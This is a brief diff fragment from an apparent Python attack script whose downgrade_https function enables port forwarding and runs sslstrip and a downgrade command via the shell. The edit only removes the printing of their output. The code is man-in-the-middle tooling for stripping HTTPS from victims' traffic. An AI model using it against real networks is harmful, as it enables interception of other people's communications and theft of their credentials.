@@ -11,6 +11,6 @@ def downgrade_https():
     enable_port_fwd()
     #try:
     proc = subprocess.Popen("sslstrip", shell=True, stdout=subprocess.PIPE)
-    print(proc.communicate()[0]),
+    proc.communicate()[0]
     proc = subprocess.Popen(downgrade_cmd, shell=True, stdout=subprocess.PIPE)
-    print(proc.communicate()[0]),
+    proc.communicate()[0]
